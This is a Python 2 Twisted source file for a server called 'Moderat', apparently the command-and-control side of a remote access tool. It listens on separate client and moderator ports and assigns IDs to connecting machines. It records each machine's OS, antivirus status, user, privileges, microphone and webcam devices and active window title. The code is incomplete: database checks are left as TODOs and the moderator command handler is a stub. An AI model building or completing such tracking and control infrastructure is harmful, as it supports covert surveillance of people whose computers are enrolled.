from twisted.internet.protocol import Protocol, ServerFactory
from twisted.internet import reactor, task

import logging
from logging.handlers import RotatingFileHandler
import sys

import string
import random
import ast

LOGFILE = 'server.log'
CLIENTS_PORT = 4434
MODERATORS_PORT = 1313

# Initialize logger
log = logging.getLogger('')
log.setLevel(logging.DEBUG)
format = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")

ch = logging.StreamHandler(sys.stdout)
ch.setFormatter(format)
log.addHandler(ch)

fh = logging.handlers.RotatingFileHandler(LOGFILE, maxBytes=(1048576*5), backupCount=7)
fh.setFormatter(format)
log.addHandler(fh)


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class ModeratServerProtocol(Protocol):

    # New Connection Made
    def connectionMade(self):
        self.send_message_to_client(self, 'connectSuccess', 'welcome')

    def connectionLost(self, reason):
        self.factory.clients = {key: value for key, value in self.factory.clients.items() if value is not self}

    def dataReceived(self, data):
        # Data Received
        command = self.recieve_message(data)
        # Switch to client commands
        if command['from'] == 'client':
            self.client_commands(command['payload'], command['mode'])
        # Switch to moderator commands
        elif command['from'] == 'moderator':
            self.moderator_commands(command['payload'], command['mode'])

    def client_commands(self, payload, mode):

        # Clients Initializing
        if mode == 'clientInitializing':

            # If client has no key generate new one and send
            if payload == 'noKey':
                key = id_generator()
                # TODO: Write Client db
                self.send_message_to_client(self, key, 'clientInitializing')

            # else get key from client
            else:
                key = payload
                # TODO: Check DB
                self.send_message_to_client(self, key, 'clientInitializing')
            self.factory.clients[payload] = {
                'id': key,
                'sock': self,
            }
            log.info('[*] New Client from %s' % self.transport.getHost())

        # Clients Status Checker
        elif mode == 'infoChecker':
            if self.factory.clients.has_key(payload['key']):
                self.factory.clients[payload['key']] = {
                    'ip_address':           self.transport.getHost().host,
                    'ostype':               payload['os_type'],
                    'os':                   payload['os'],
                    'protection':           payload['protection'],
                    'user':                 payload['user'],
                    'privileges':           payload['privileges'],
                    'inputdevice':          payload['audio_device'],
                    'webcamdevice':         payload['webcamera_device'],
                    'activewindowtitle':    payload['window_title'],
                    'keypassword':          payload['key'],
                }
            else:
                pass

    def moderator_commands(self, payload, client_id):
        print 'send'

    def recieve_message(self, data, end='[ENDOFMESSAGE]'):
        return ast.literal_eval(data[:-len(end)].decode('utf-8'))

    def send_message_to_client(self, client, message, mode, _from='server', end='[ENDOFMESSAGE]'):
        # Send Data Function
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'to': '',
        }
        client.transport.write(str(message)+end)

    def send_message_to_moderator(self, moderator, message):
        self.factory.clients[moderator]['sock'].transport.write(str(message))


class ModeratServerFactory(ServerFactory):

    log.info('Moderat Server Started')

    protocol = ModeratServerProtocol

    def __init__(self):
        self.clients = {}


reactor.listenTCP(CLIENTS_PORT, ModeratServerFactory())
log.info('Set Clients Port to %s' % str(CLIENTS_PORT))
reactor.listenTCP(MODERATORS_PORT, ModeratServerFactory())
log.info('Set Moderators Port to %s' % str(MODERATORS_PORT))
reactor.run()